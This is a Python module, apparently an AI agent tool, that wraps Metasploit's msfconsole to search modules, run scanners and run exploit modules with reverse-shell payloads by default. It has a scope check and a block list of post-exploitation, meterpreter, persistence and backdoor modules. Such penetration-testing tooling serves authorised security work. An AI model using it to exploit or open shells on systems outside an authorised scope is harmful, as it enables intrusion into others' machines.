"""Metasploit Framework integration — wraps msfconsole CLI for automated exploit execution."""

import re
import logging
import subprocess
from datetime import datetime

from .scope_checker import scope_guard
from .logs_helper import log_path

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Safety: blocked module path fragments (post-exploitation, persistence, etc.)
# ---------------------------------------------------------------------------
BLOCKED_MODULE_PATTERNS = (
    "post/",
    "payload/meterpreter",
    "persistence",
    "backdoor",
)

# Default payloads (reverse shells only — never bind shells)
DEFAULT_PAYLOADS = {
    "unix": "cmd/unix/reverse",
    "generic": "generic/shell_reverse_tcp",
}


def _is_module_blocked(module: str) -> str | None:
    """Return an error string if the module is blocked, None if allowed."""
    mod_lower = module.lower()
    for pattern in BLOCKED_MODULE_PATTERNS:
        if pattern in mod_lower:
            return (
                f"BLOCKED: Module '{module}' matches blocked pattern '{pattern}'. "
                "Post-exploitation, meterpreter, persistence, and backdoor modules "
                "are not permitted. Only exploit/ and auxiliary/ modules are allowed."
            )
    return None


def _build_search_command(search_term: str) -> str:
    """Build msfconsole command string for module search."""
    safe_term = search_term.replace('"', '\\"').replace(";", "")
    return f'search {safe_term}; exit'


def _build_exploit_command(module: str, target: str, options: dict) -> str:
    """Build msfconsole command string for exploit execution."""
    cmds = [f"use {module}"]
    cmds.append(f"set RHOSTS {target}")

    # Determine payload: use provided or default
    payload = options.pop("PAYLOAD", None) or options.pop("payload", None)
    if not payload:
        if "unix" in module.lower() or "linux" in module.lower():
            payload = DEFAULT_PAYLOADS["unix"]
        else:
            payload = DEFAULT_PAYLOADS["generic"]
    cmds.append(f"set PAYLOAD {payload}")

    # Apply all remaining options
    for key, value in options.items():
        safe_key = str(key).replace(";", "")
        safe_val = str(value).replace(";", "")
        cmds.append(f"set {safe_key} {safe_val}")

    cmds.append("run")
    cmds.append("exit")
    return "; ".join(cmds)


def _build_auxiliary_command(module: str, target: str, options: dict) -> str:
    """Build msfconsole command string for auxiliary module execution."""
    cmds = [f"use {module}"]
    cmds.append(f"set RHOSTS {target}")

    for key, value in options.items():
        safe_key = str(key).replace(";", "")
        safe_val = str(value).replace(";", "")
        cmds.append(f"set {safe_key} {safe_val}")

    cmds.append("run")
    cmds.append("exit")
    return "; ".join(cmds)


def _parse_search_results(output: str) -> str:
    """Parse msfconsole search output into a readable summary."""
    lines = output.strip().splitlines()
    modules = []
    for line in lines:
        # Module lines typically start with spaces and contain a module path
        match = re.match(
            r"\s*\d+\s+(exploit/\S+|auxiliary/\S+|encoder/\S+|nop/\S+|evasion/\S+)\s+(.*)",
            line,
        )
        if match:
            mod_path = match.group(1)
            rest = match.group(2).strip()
            modules.append(f"  {mod_path:60s} {rest}")

    if modules:
        return f"Found {len(modules)} modules:\n" + "\n".join(modules[:40])
    # Fallback: return trimmed raw output
    trimmed = "\n".join(l for l in lines if l.strip() and "msf" not in l.lower()[:10])
    return trimmed[-2000:] if len(trimmed) > 2000 else trimmed


def _parse_exploit_results(output: str) -> str:
    """Parse exploit/auxiliary output for sessions, vulns, and key events."""
    lines = output.strip().splitlines()
    findings = []

    for line in lines:
        lower = line.lower()
        if any(kw in lower for kw in ("session", "opened", "shell", "command shell",
                                       "vulnerable", "found", "success", "[+]", "[*]")):
            findings.append(line.strip())

    if findings:
        return "\n".join(findings[-50:])
    # Fallback: return tail of output
    tail = "\n".join(lines[-30:])
    return tail


def run(
    action: str,
    module: str = "",
    target: str = "",
    options: dict | None = None,
    search_term: str = "",
    timeout: int = 120,
) -> str:
    """Execute a Metasploit action (search, exploit, or auxiliary)."""
    options = options or {}

    # ------------------------------------------------------------------
    # Validate action
    # ------------------------------------------------------------------
    if action not in ("search", "exploit", "auxiliary"):
        return (
            f"Invalid action '{action}'. Supported actions: search, exploit, auxiliary."
        )

    # ------------------------------------------------------------------
    # Scope guard: enforce for exploit and auxiliary (target required)
    # ------------------------------------------------------------------
    if action in ("exploit", "auxiliary"):
        if not target:
            return "Target (RHOSTS) is required for exploit and auxiliary actions."
        guard = scope_guard(target)
        if guard:
            return guard

    # ------------------------------------------------------------------
    # Module safety check
    # ------------------------------------------------------------------
    if module:
        blocked = _is_module_blocked(module)
        if blocked:
            return blocked

    # Also check payload in options
    for key in ("PAYLOAD", "payload"):
        if key in options:
            blocked = _is_module_blocked(options[key])
            if blocked:
                return blocked

    # ------------------------------------------------------------------
    # Action: search
    # ------------------------------------------------------------------
    if action == "search":
        if not search_term:
            return "search_term is required for action=search."
        msf_cmd = _build_search_command(search_term)

    # ------------------------------------------------------------------
    # Action: exploit
    # ------------------------------------------------------------------
    elif action == "exploit":
        if not module:
            return "module is required for action=exploit."
        if not module.startswith("exploit/"):
            return (
                f"Module '{module}' does not look like an exploit module. "
                "Expected path starting with 'exploit/' (e.g., exploit/multi/http/struts2_rce)."
            )
        # LHOST must be explicitly provided
        lhost = options.get("LHOST") or options.get("lhost")
        if not lhost:
            return (
                "LHOST is required for exploit actions. "
                "Provide it in options: {\"LHOST\": \"<your-ip>\"}. "
                "Auto-detection is disabled for safety."
            )
        msf_cmd = _build_exploit_command(module, target, dict(options))

    # ------------------------------------------------------------------
    # Action: auxiliary
    # ------------------------------------------------------------------
    elif action == "auxiliary":
        if not module:
            return "module is required for action=auxiliary."
        if not module.startswith("auxiliary/"):
            return (
                f"Module '{module}' does not look like an auxiliary module. "
                "Expected path starting with 'auxiliary/' (e.g., auxiliary/scanner/http/http_version)."
            )
        msf_cmd = _build_auxiliary_command(module, target, dict(options))

    # ------------------------------------------------------------------
    # Execute msfconsole
    # ------------------------------------------------------------------
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = log_path(f"metasploit_{action}_{ts}.txt")

    cmd = ["msfconsole", "-q", "-x", msf_cmd]

    logger.info("Running msfconsole: action=%s module=%s target=%s", action, module, target)

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        output = result.stdout + "\n" + result.stderr

        # Write full output to session log
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(f"# Metasploit {action} — {datetime.now().isoformat()}\n")
                f.write(f"# Module: {module}\n")
                f.write(f"# Target: {target}\n")
                f.write(f"# Command: msfconsole -q -x \"{msf_cmd}\"\n")
                f.write("# " + "=" * 70 + "\n\n")
                f.write(output)
        except OSError as write_err:
            logger.warning("Could not write log file %s: %s", output_file, write_err)

        # Parse and return summary
        if action == "search":
            summary = _parse_search_results(output)
            return f"Metasploit search for '{search_term}':\n{summary}"
        else:
            summary = _parse_exploit_results(output)
            return (
                f"Metasploit {action} — {module} vs {target}:\n"
                f"{summary}\n\n"
                f"Full output logged to: {output_file}"
            )

    except subprocess.TimeoutExpired:
        return (
            f"Metasploit timed out after {timeout}s. "
            "Try increasing timeout or using a simpler module."
        )
    except FileNotFoundError:
        return (
            "[TOOL OK, BINARY MISSING] msfconsole is not installed on this system. "
            "Install Metasploit Framework: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html "
            "This does NOT mean the run_metasploit tool is unavailable — it just needs the msfconsole binary."
        )
    except Exception as e:
        logger.error("Metasploit error: %s", e)
        return f"Metasploit error: {str(e)}"


TOOL_SPEC = {
    "name": "run_metasploit",
    "description": (
        "Automated Metasploit Framework integration for exploit and auxiliary module execution. "
        "Actions: search (find modules by keyword/CVE), exploit (run exploit modules with "
        "reverse shell payloads), auxiliary (run scanners/fuzzers without payloads). "
        "Safety: blocks post-exploitation, meterpreter, persistence, and backdoor modules. "
        "LHOST must be explicitly provided for exploits. All output is session-logged."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "description": "Action to perform: search | exploit | auxiliary",
            },
            "module": {
                "type": "string",
                "description": "Module path (e.g., exploit/multi/http/apache_struts_rce, auxiliary/scanner/http/http_version)",
            },
            "target": {
                "type": "string",
                "description": "Target IP or hostname (RHOSTS)",
            },
            "options": {
                "type": "object",
                "description": "Additional MSF options as key-value pairs (RPORT, LHOST, LPORT, TARGETURI, etc.)",
            },
            "search_term": {
                "type": "string",
                "description": "Search term for action=search (e.g., 'apache struts', 'CVE-2021-44228')",
            },
            "timeout": {
                "type": "integer",
                "description": "Timeout in seconds (default 120)",
            },
        },
        "required": ["action"],
    },
}
